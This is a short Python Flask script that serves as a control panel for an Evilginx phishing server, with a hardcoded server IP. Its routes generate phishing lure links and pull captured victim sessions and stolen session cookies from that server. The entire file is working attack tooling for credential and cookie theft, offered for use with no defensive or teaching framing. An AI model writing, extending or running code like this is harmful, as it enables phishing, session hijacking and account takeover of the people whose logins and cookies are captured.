from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

EVILGINX_SERVER = "http://3.149.242.245"  # Change this to your Evilginx server IP or domain
EVILGINX_API_PORT = 5000  # Updated to use port 5000

# Route to generate a phishing link
@app.route('/generate_link', methods=['POST'])
def generate_link():
    data = request.json
    lure_id = data.get("lure_id")
    
    if not lure_id:
        return jsonify({"error": "Lure ID is required"}), 400

    response = requests.get(f"{EVILGINX_SERVER}/api/lures/{lure_id}")
    if response.status_code == 200:
        lure_data = response.json()
        return jsonify({"link": lure_data["phishlet"]})
    else:
        return jsonify({"error": "Failed to generate link"}), 500

# Route to fetch captured sessions
@app.route('/captured_sessions', methods=['GET'])
def captured_sessions():
    response = requests.get(f"{EVILGINX_SERVER}/api/sessions")
    
    if response.status_code == 200:
        return jsonify(response.json())
    else:
        return jsonify({"error": "Failed to fetch captured sessions"}), 500

# Route to fetch cookies
@app.route('/get_cookies', methods=['GET'])
def get_cookies():
    response = requests.get(f"{EVILGINX_SERVER}/api/sessions/cookies")
    
    if response.status_code == 200:
        return jsonify(response.json())
    else:
        return jsonify({"error": "Failed to fetch cookies"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=EVILGINX_API_PORT, debug=True)
